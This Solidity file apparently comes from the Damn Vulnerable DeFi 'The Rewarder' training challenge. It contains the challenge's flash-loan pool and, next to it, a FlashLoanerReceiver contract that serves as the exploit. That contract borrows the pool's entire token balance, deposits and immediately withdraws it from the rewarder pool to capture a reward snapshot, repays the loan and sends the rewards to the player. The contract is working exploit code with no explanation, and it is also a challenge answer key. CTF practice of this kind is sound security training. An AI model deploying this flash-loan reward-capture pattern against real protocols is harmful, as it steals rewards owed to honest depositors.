// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableToken.sol";
import "./TheRewarderPool.sol";

/**
 * @title FlashLoanerPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 * @dev A simple pool to get flashloans of DVT
 */
contract FlashLoanerPool is ReentrancyGuard {
    using Address for address;

    DamnValuableToken public immutable liquidityToken;

    error NotEnoughTokenBalance();
    error CallerIsNotContract();
    error FlashLoanNotPaidBack();

    constructor(address liquidityTokenAddress) {
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
    }

    function flashLoan(uint256 amount) external nonReentrant {
        uint256 balanceBefore = liquidityToken.balanceOf(address(this));

        if (amount > balanceBefore) {
            revert NotEnoughTokenBalance();
        }

        if (!msg.sender.isContract()) {
            revert CallerIsNotContract();
        }

        liquidityToken.transfer(msg.sender, amount);

        msg.sender.functionCall(
            abi.encodeWithSignature("receiveFlashLoan(uint256)", amount)
        );

        if (liquidityToken.balanceOf(address(this)) < balanceBefore) {
            revert FlashLoanNotPaidBack();
        }
    }
}

contract FlashLoanerReceiver {
    DamnValuableToken public immutable i_liquidityToken;
    FlashLoanerPool public immutable i_flashLoanerPool;
    TheRewarderPool public immutable i_rewarderPool;
    RewardToken public immutable i_rewardToken;
    address public immutable i_player;

    constructor(
        address _liquidityTokenAddress,
        FlashLoanerPool _flashLoanerPool,
        TheRewarderPool _rewarderPool,
        RewardToken _rewardToken,
        address _player
    ) {
        i_liquidityToken = DamnValuableToken(_liquidityTokenAddress);
        i_flashLoanerPool = _flashLoanerPool;
        i_rewarderPool = _rewarderPool;
        i_rewardToken = _rewardToken;
        i_player = _player;
    }

    function executeFlashLoan(uint256 amount) external {
        i_flashLoanerPool.flashLoan(
            i_liquidityToken.balanceOf(address(i_flashLoanerPool))
        );
    }

    function receiveFlashLoan(uint256 amount) external {
        _approveDepositWithdraw(amount);

        i_liquidityToken.transfer(address(i_flashLoanerPool), amount);
        i_rewardToken.transfer(
            i_player,
            i_rewardToken.balanceOf(address(this))
        );
    }

    function _approveDepositWithdraw(uint256 amount) internal {
        i_liquidityToken.approve(address(i_rewarderPool), amount);
        i_rewarderPool.deposit(amount);
        i_rewarderPool.withdraw(amount);
    }
}
